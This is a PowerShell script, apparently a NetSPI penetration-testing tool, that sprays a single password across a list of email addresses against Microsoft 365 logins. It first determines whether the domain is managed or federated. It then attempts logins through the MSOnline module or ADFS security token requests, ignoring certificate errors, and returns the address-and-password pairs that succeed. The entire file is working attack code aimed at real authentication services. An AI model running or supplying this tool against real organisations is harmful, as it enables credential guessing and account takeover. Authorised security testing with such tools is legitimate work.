#requires -Modules MSOnline

<#
	    .SYNOPSIS
	       This script can be used to attempt user logins against federated/managed domains using Microsoft's APIs.

	    .DESCRIPTION
	       This script can be used to attempt authentication against authentication points for federated domains. Credentials are sent to Microsoft using the connect-msolservice PowerShell module. Successful usernames/passwords are then returned as a datatable.

	    .EXAMPLE
	       
	       PS C:\> Invoke-ExternalDomainBruteforce -email test@test.com -password "Password123" -domain "test.com" | ft -AutoSize

			Email              Password      
			-----              ----          
			test@test.com      Password123 

	       
	    .EXAMPLE
	       
	       PS C:\> Invoke-ExternalDomainBruteforce -list "C:\Temp\emails.txt" -password "Password123" -domain "test.com"  | ft -AutoSize

			Email                Password      
			-----                ----          
			test@test.com        Password123
			test39@test.com      Password123 

	     .NOTES
	     Author: Ryan Gandrud (@siegenapster), NetSPI - 2017
	     Author: Karl Fosaaen (@kfosaaen), NetSPI - 2016
	     Contributors: Scott Sutherland (@_nullbind)
	       	       
	     .LINK
	       https://blog.netspi.com/using-powershell-identify-federated-domains/
		   http://www.economyofmechanism.com/office365-authbypass.html
		   https://blogs.msdn.microsoft.com/besidethepoint/2012/10/17/request-adfs-security-token-with-powershell/
		   https://msdn.microsoft.com/en-us/library/jj151815.aspx
		   https://technet.microsoft.com/en-us/library/dn568015.aspx
#>

#Pulled from Karl Fosaaen's script at
#https://github.com/NetSPI/PowerShell/blob/master/Get-FederationEndpoint.ps1
function Get-FederationEndpoint{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Domain name to get the ADFS endpoint for.")]
        [string]$domain
        
    )

    # "Test" Email
    $email = "test@"+$domain

    # Microsoft URL to get the JSON response from
    $url = "https://login.microsoftonline.com/common/userrealm/?user="+$email+"&api-version=2.1&checkForMicrosoftAccount=true";

    # Create data table to house results
    $DomainTestResults = new-object system.data.datatable
    $DomainTestResults.columns.add("Domain") | Out-Null
    $DomainTestResults.columns.add("Type") | Out-Null
    $DomainTestResults.columns.add("BrandName") | Out-Null
    $DomainTestResults.columns.add("CMD") | Out-Null
   
    try{

        # Make the request
        $JSON = Invoke-RestMethod -Uri $url

        # Handle the Response
        $NameSpaceType = $JSON[0].NameSpaceType

        if ($NameSpaceType -eq "Managed"){
            
            #Add data to the table
            $DomainTestResults.Rows.Add($JSON[0].DomainName, "Managed", $JSON[0].FederationBrandName, "NA") | Out-Null

            if ($cmd){

                # Check if AzureAD module is installed
                if (Get-Module -Name MsOnline){}
                else{Write-Host "`n`t*Requires AzureAD PowerShell module to be installed and loaded - https://msdn.microsoft.com/en-us/library/jj151815.aspx"}
            }
        }
        ElseIf ($NameSpaceType -eq "Federated"){

            # Parse Stuff
            $username = $email.Split("@")[0]
            $domain = $JSON[0].DomainName
            $ADFSBaseUri = [string]$JSON[0].AuthURL.Split("/")[0]+"//"+[string]$JSON[0].AuthURL.Split("/")[2]+"/"
            $AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"

            
            # Add data to the table
            $DomainTestResults.Rows.Add($JSON[0].DomainName, "Federated", $JSON[0].FederationBrandName, $JSON[0].AuthURL) | Out-Null

        }
        Else{
            
            # If the domain has no federation information available from Microsoft
            $DomainTestResults.Rows.Add("NA", "NA", "NA", "NA") | Out-Null
        }
    }
    catch{
        Write-Host "`nThe Request out to Microsoft failed."
    }

    Return $DomainTestResults
}

function Invoke-ExternalDomainBruteforce{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Email address to test password against ADFS endpoint.")]
        [string]$email,

        [Parameter(Mandatory=$true,
        HelpMessage="Password to test against username(s).")]
        [string]$password,

        [Parameter(Mandatory=$true,
        HelpMessage="Domain of users.")]
        [string]$domain,
		
		[Parameter(Mandatory=$false,
        HelpMessage="Location of list of usernames/emails to test. E.g. C:\temp\emails.txt")]
        [string]$list
    )

	if($list){
		$Users = Get-Content $list
    }
	elseif($email) {
		$Users = $email
	}
	
    # Create data table to house results
    $EmailTestResults = new-object system.data.datatable
    $EmailTestResults.columns.add("Email") | Out-Null
    $EmailTestResults.columns.add("Domain") | Out-Null
    $EmailTestResults.columns.add("Password") | Out-Null
    
	# Get-FederationEndpoint for type of domain
    $info = Get-FederationEndpoint -domain $domain
	
	
    if ($info[1] -eq "Managed" ) {

		$Users | ForEach-Object {
		    
            # Checking if Powershell is running as Administrator
            # Running as Administrator is necessary for opening new local PSSessions
            $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent() )
            if($currentPrincipal.IsInRole( [Security.Principal.WindowsBuiltInRole]::Administrator)){}
            else{Write-Host "Administrative rights are needed to test Managed domains.`nPlease re-open powershell as an administrator." -ForegroundColor Red;break}
		
			try{
				# Make all errors terminating to get try/catch to work.
				$ErrorActionPreference = "Stop";
			
				# Set up new PSSession
				$s = New-PSSession -Name AzureBruteForce
                
				# Set up credentials and connect to Azure cloud in PSSession
				Invoke-Command -Session $s -ScriptBlock {$User = "$($args[0])";$PWord = ConvertTo-SecureString -String "$($args[1])" -AsPlainText -Force;$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord;connect-msolservice -credential $Credential} -ArgumentList $_,$password
				
				# Try accessing user information to confirm connection set up
				# If successful, record email and password in table
				if(Invoke-Command -Session $s -ScriptBlock {Get-MsolUser -UserPrincipalName $User}) {
					$EmailTestResults.Rows.Add($_, "N/A", $password) | Out-Null
					Write-Host 'Authentication Successful: '$_' - '$password -ForegroundColor Green
				}
			
				# Kill and remove PSSession
				Remove-PSSession -Session $s
			}

			catch{
				# Make sure to remove PSSession
				Remove-PSSession -Session $s
				Write-Host 'Authentication Failure: '$email' - '$password -ForegroundColor Red
			}
		}
    }
	
    ElseIf($info[1] -eq "Federated") {
		
		$Users | ForEach-Object {
		
            $user = $_

			# Check if Invoke-ADFSSecurityTokenRequest is loaded
			try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
			catch{Write-Host `n'*Requires the command imported from here - https://gallery.technet.microsoft.com/scriptcenter/Invoke-ADFSSecurityTokenReq-09e9c90c' -ForegroundColor Red;break
			}
			
			# Parse the JSON URI into usable formats
			$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
			$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
			
			# Attempt to request a security token using username/password
            try{
                $ErrorActionPreference = "Stop";
                Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
                $EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
                Write-Host 'Authentication Successful: '$info[0]\$user' - '$password -ForegroundColor Green
            }
            catch{
                Write-Host 'Authentication Failure: '$info[0]\$user' - '$password -ForegroundColor Red
            }

		}
	}

    Else{
        Write-Host "`nSomething has gone horribly wrong!`nIs your domain name correct?"
    }


    Return $EmailTestResults
}
